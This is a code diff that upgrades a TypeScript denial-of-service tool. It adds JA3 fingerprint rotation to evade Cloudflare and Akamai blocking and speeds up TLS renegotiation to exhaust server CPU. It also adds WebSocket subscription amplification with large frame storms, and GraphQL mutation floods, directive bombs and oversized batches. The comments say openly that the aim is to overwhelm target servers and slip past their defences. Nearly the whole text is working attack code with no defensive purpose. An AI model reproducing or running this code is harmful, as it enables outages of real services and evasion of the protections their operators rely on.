@@ -1924,9 +1924,12 @@ async function runWAFBypass(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  // ── VECTOR I: Chrome H2 Primary Flood ────────────────────────────────────
-  // 256 streams/connection, 10-80ms reconnect (vs old 128 streams, 150-500ms)
-  // POST 22% of requests to hit form handlers, not just GET routes
+  // ── VECTOR I: Chrome H2 Primary Flood + VECTOR VIII: JA3 Fingerprint Rotation ──
+  // 256 streams/connection, 10-80ms reconnect. Each connection gets a fresh JA3
+  // cipher suite from randomJA3Ciphers(). MAX_CONN_LIFE = 30s forces reconnect
+  // even on long-running idle connections → continuous fingerprint rotation.
+  // Cloudflare/Akamai fingerprint-based blocking can't keep up with rotating JA3.
+  const MAX_CONN_LIFE_MS = 30_000; // ★ VECTOR VIII: force reconnect every 30s → fresh JA3
   const runPrimarySlot = async (tgt = target): Promise<void> => {
     const sessionProfile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
     const cookieJar      = new Map<string, string>();
@@ -1937,13 +1940,15 @@ async function runWAFBypass(
           c = h2connect(tgt, {
             rejectUnauthorized: false,
             servername:         hostname,
-            ciphers:            randomJA3Ciphers(),
+            ciphers:            randomJA3Ciphers(), // ★ fresh JA3 fingerprint each reconnect
             settings:           CHROME_H2_SETTINGS,
             ALPNProtocols:      ["h2", "http/1.1"],
           });
         } catch { resolve(); return; }
+        // ★ Force reconnect after 30s even if connection is healthy (fingerprint rotation)
         const conn    = c;
-        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
+        const lifeTimer = setTimeout(() => { try { conn.destroy(); } catch { /**/ } resolve(); }, MAX_CONN_LIFE_MS);
+        const cleanup = () => { clearTimeout(lifeTimer); try { conn.destroy(); } catch { /**/ } resolve(); };
         let inflight  = 0;
         const pump = () => {
           if (signal.aborted || conn.destroyed) { resolve(); return; }
@@ -2742,18 +2747,18 @@ async function runTLSRenego(
         sock.renegotiate({ rejectUnauthorized: false }, (err) => {
           if (err || signal.aborted) { try { sock.destroy(); } catch { /**/ } done(); return; }
           localPkts++; localBytes += 2800; // ~2.8KB RSA TLS handshake (larger than ECDHE)
-          // ★ Randomized 50–150ms interval (was fixed 200ms) → 7–20 renegotiations/sec per slot
-          // Random timing also defeats per-second rate limiters that expect fixed intervals.
-          setTimeout(doRenego, randInt(50, 150));
+          // ★ v3: 20–60ms interval → 16–50 renegotiations/sec per slot (was 50–150ms / 7–20/s)
+          // Tighter timing = more RSA private key operations per second on server CPU
+          setTimeout(doRenego, randInt(20, 60));
         });
       } catch { done(); }
     };
 
     sock.once("secureConnect", () => {
-      // Initial keepalive request so server doesn't close idle connection
-      sock.write(`HEAD / HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n\r\n`);
-      localPkts++; localBytes += 60;
-      setTimeout(doRenego, 100); // start renegotiation sooner (was 300ms)
+      // Initial request: use OPTIONS /* to trigger CORS preflight processing (extra server work)
+      sock.write(`OPTIONS * HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\nOrigin: https://${randIp()}.amazonaws.com\r\nAccess-Control-Request-Method: POST\r\n\r\n`);
+      localPkts++; localBytes += 120;
+      setTimeout(doRenego, 50); // start renegotiation at 50ms (was 100ms)
     });
 
     sock.on("data",    () => {});
@@ -2767,8 +2772,8 @@ async function runTLSRenego(
   const runSlot = async (): Promise<void> => {
     while (!signal.aborted) {
       await oneSlot();
-      // Longer pause than H2 methods — RSA handshake costs should be spaced to avoid self-DoS
-      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(150, 300)));
+      // v3: 50–100ms reconnect (was 150–300ms) → faster slot recycling, more RSA work on server
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(50, 100)));
     }
   };
 
@@ -3026,33 +3031,72 @@ async function runWSFlood(
         if (respBuf.includes("101")) {
           upgraded = true; activeConns++;
           localPkts++; localBytes += 200;
-          // Ping every 20s to keep the server's WS goroutine alive
+
+          // ★ v3 WebSocket Amplification: send subscription registration immediately
+          // GraphQL-over-WS: server allocates subscription state + data fetcher goroutine per sub
+          const GQL_TYPES = ["users","posts","comments","orders","notifications","messages","events","feeds"];
+          const gqlSubs = [
+            `{"type":"connection_init","payload":{}}`,
+            `{"type":"subscribe","id":"${randStr(8)}","payload":{"query":"subscription{${GQL_TYPES[randInt(0,GQL_TYPES.length)]}Updated{id name createdAt data}}"}}`,
+            `{"type":"subscribe","id":"${randStr(8)}","payload":{"query":"subscription{onMessage{id body from to timestamp}}"}}`,
+          ];
+          // STOMP-style subscription (works on Spring/ActiveMQ backends)
+          const stompSub = `SUBSCRIBE\ndestination:/topic/${randStr(8)}\nid:sub-${randStr(4)}\n\n\x00`;
+          // Socket.io subscription
+          const sioSub = `42["subscribe","${GQL_TYPES[randInt(0,GQL_TYPES.length)]}","*"]`;
+
+          // Send initial subscription messages
+          for (const msg of gqlSubs) {
+            const encoded = Buffer.from(msg, "utf8");
+            const len = encoded.length;
+            const hdr = len < 126
+              ? Buffer.from([0x81, len])
+              : Buffer.from([0x81, 126, (len >> 8) & 0xff, len & 0xff]);
+            try { sock.write(Buffer.concat([hdr, encoded])); localPkts++; localBytes += hdr.length + len; } catch { /**/ }
+          }
+          // Also try STOMP and Socket.io
+          for (const msg of [stompSub, sioSub]) {
+            const encoded = Buffer.from(msg, "utf8");
+            const len = encoded.length;
+            const hdr = len < 126 ? Buffer.from([0x81, len]) : Buffer.from([0x81, 126, (len >> 8) & 0xff, len & 0xff]);
+            try { sock.write(Buffer.concat([hdr, encoded])); } catch { /**/ }
+          }
+
+          // ★ HIGH-FREQUENCY frame storm: 800ms interval (was 8000ms — 10× more aggressive)
+          // Each frame: server must parse WS frame header + allocate message buffer + process
+          // At 800ms × 1000 conns = 1250 server-side parse+alloc operations/sec
           pingIv = setInterval(() => {
             if (signal.aborted || !upgraded) { done(); sock.destroy(); return; }
             try {
-              // Alternate: PING frames + large binary frames (TEXT opcode 0x81)
-              // Large frames force server to parse frame header, allocate read buffer,
-              // process the message — 5–64 KB per write × hundreds of conns = RAM + CPU exhaustion
-              if (Math.random() < 0.35) {
-                const frameSize = randInt(4096, 65535);
-                const frameHdr  = frameSize < 126
-                  ? Buffer.from([0x82, frameSize])           // FIN + binary, 1-byte len
-                  : Buffer.from([0x82, 126,
-                      (frameSize >> 8) & 0xff,
-                       frameSize       & 0xff,               // 2-byte extended len
-                    ]);
+              const r = Math.random();
+              if (r < 0.30) {
+                // Large binary frame (16KB–128KB) — forces server buffer alloc + message parse
+                const frameSize = randInt(16384, 131072);
+                const frameHdr  = Buffer.from([0x82, 127,
+                  0, 0, 0, 0,
+                  (frameSize >> 24) & 0xff, (frameSize >> 16) & 0xff,
+                  (frameSize >> 8)  & 0xff,  frameSize         & 0xff,
+                ]);
                 const payload = Buffer.allocUnsafe(frameSize);
-                // Fill with random bytes — prevents server compression shortcuts
                 for (let i = 0; i + 4 <= frameSize; i += 4)
                   payload.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
                 sock.write(Buffer.concat([frameHdr, payload]));
                 localPkts++; localBytes += frameHdr.length + frameSize;
+              } else if (r < 0.60) {
+                // GraphQL subscription message — forces server-side subscription resolver
+                const sub = gqlSubs[randInt(1, gqlSubs.length)];
+                const encoded = Buffer.from(sub, "utf8");
+                const len = encoded.length;
+                const hdr = len < 126 ? Buffer.from([0x81, len]) : Buffer.from([0x81, 126, (len >> 8) & 0xff, len & 0xff]);
+                sock.write(Buffer.concat([hdr, encoded]));
+                localPkts++; localBytes += hdr.length + len;
               } else {
+                // PING frame — server must ACK each one
                 sock.write(PING_FRAME); localPkts++; localBytes += 2;
               }
             }
             catch { done(); }
-          }, 8_000);
+          }, 800); // ★ 800ms (was 8000ms) — 10× amplification factor
         } else if (respBuf.length > 8192) {
           // Not a WS path — outer while-loop will try a different path automatically
           sock.destroy(); done(); return;
@@ -3154,13 +3198,41 @@ async function runGraphQLDoS(
     return frags.join("\n") + `\nquery Q { ${aliases} }`;
   };
 
-  // Batched array of queries (many operations in one HTTP request)
-  const buildBatch = (size = randInt(5, 25)): string => {
+  // ★ Mutation flood — writes are far more expensive than reads (lock acquisition + DB write)
+  const buildMutationFlood = (count = randInt(20, 60)): string => {
+    const ops = Array.from({ length: count }, (_, i) => {
+      const t = TYPES[randInt(0, TYPES.length)];
+      const T = t.charAt(0).toUpperCase() + t.slice(1);
+      return `m${i}: update${T}(input:{id:${randInt(1,999999)},data:"${randStr(32)}",ts:${Date.now()}}) { id ${FIELDS[randInt(0,FIELDS.length)]} }`;
+    }).join(" ");
+    return `mutation M { ${ops} }`;
+  };
+
+  // ★ Directive bomb — many @skip/@include directives force per-field directive evaluation
+  const buildDirectiveBomb = (): string => {
+    const t = TYPES[randInt(0, TYPES.length)];
+    const fields = FIELDS.map(f =>
+      `${f} @skip(if: ${Math.random() < 0.5}) @include(if: ${Math.random() < 0.5})`
+    ).join(" ");
+    return `{ ${t}(id: ${randInt(1,999999)}) { ${fields} } }`;
+  };
+
+  // ★ Subscription request — server allocates long-lived subscription state per request
+  const buildSubscriptionBomb = (): string => {
+    const t = TYPES[randInt(0, TYPES.length)];
+    return `subscription S { ${t}Changed(filter:{id:${randInt(1,999999)}}) { id ${FIELDS.slice(0,4).join(" ")} } }`;
+  };
+
+  // Batched array — v3: 20–80 operations (was 5–25) = 3–4× more server computation per request
+  const buildBatch = (size = randInt(20, 80)): string => {
     const ops = Array.from({ length: size }, () => {
       const r = Math.random();
-      const q = r < 0.25 ? buildAliasBomb()
-              : r < 0.5  ? buildFragmentBomb()
-              : buildNested();
+      const q = r < 0.15 ? buildMutationFlood(5)
+              : r < 0.30 ? buildDirectiveBomb()
+              : r < 0.45 ? buildFragmentBomb()
+              : r < 0.65 ? buildAliasBomb()
+              : r < 0.80 ? buildSubscriptionBomb()
+              : buildNested(randInt(10, 20));
       return { query: q, variables: {} };
     });
     return JSON.stringify(ops);
